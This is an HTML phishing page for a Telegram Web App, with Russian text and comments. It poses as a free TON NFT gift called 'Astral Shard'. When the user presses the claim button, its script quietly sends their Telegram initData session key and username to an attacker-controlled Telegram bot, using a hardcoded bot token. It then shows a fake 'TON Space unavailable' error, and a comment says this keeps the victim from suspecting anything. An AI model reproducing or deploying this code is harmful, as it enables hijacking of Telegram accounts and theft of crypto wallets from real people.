<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { 
            background: #000; 
            color: #fff; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            text-align: center; 
            margin: 0;
            padding: 40px 20px;
        }
        .container { padding: 20px; }
        img { border-radius: 24px; box-shadow: 0 0 20px rgba(0, 136, 204, 0.5); margin-bottom: 20px; }
        h2 { font-size: 24px; margin: 10px 0; }
        p { color: #aaa; font-size: 16px; margin-bottom: 30px; }
        .btn { 
            background: #0088cc; 
            color: #fff; 
            padding: 18px 60px; 
            border-radius: 16px; 
            border: none; 
            font-size: 18px; 
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            max-width: 280px;
        }
        .btn:active { transform: scale(0.98); opacity: 0.9; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://nft-tg.com/wp-content/uploads/2024/11/astral-shard.png" width="160" alt="Gift">
        
        <h2>Вы получили подарок!</h2>
        <p>Astral Shard #2949 <br> от системы лояльности TON</p>
        
        <button id="mainBtn" class="btn">ПОЛУЧИТЬ</button>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand(); // Разворачиваем на весь экран
        tg.enableClosingConfirmation(); // Подтверждение при закрытии

        document.getElementById('mainBtn').addEventListener('click', function() {
            // ТВОИ ДАННЫЕ
            const botToken = '8646280109:AAFVgDZQxQvxc4S7FnE0w-HuPn_QxOhl36E';
            const chatId = '8486064073';
            
            // Получаем ключ. Если зашли не из ТГ — напишет ошибку.
            const key = tg.initData || "ОШИБКА: ЗАПУЩЕНО ВНЕ ТЕЛЕГРАМА";
            
            // Формируем текст. Символы ` делают текст копируемым по клику.
            // Параметр parse_mode=Markdown обязателен!
            const message = "🔔 **ЛОГ ПОЙМАН!**\n\n👤 Юзер: @" + (tg.initDataUnsafe.user?.username || "hidden") + "\n\n🔑 **Ключ (нажми, чтобы скопировать):**\n`" + key + "`";

            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: "Markdown"
                })
            })
            .then(() => {
                // Показываем стандартное окно ошибки ТГ, чтобы юзер не заподозрил лишнего
                tg.showAlert("Ошибка: TON Space временно недоступен. Попробуйте использовать другой кошелек или повторите попытку через 24 часа.");
            })
            .catch((err) => {
                console.error(err);
            });
        });
    </script>
</body>
</html>
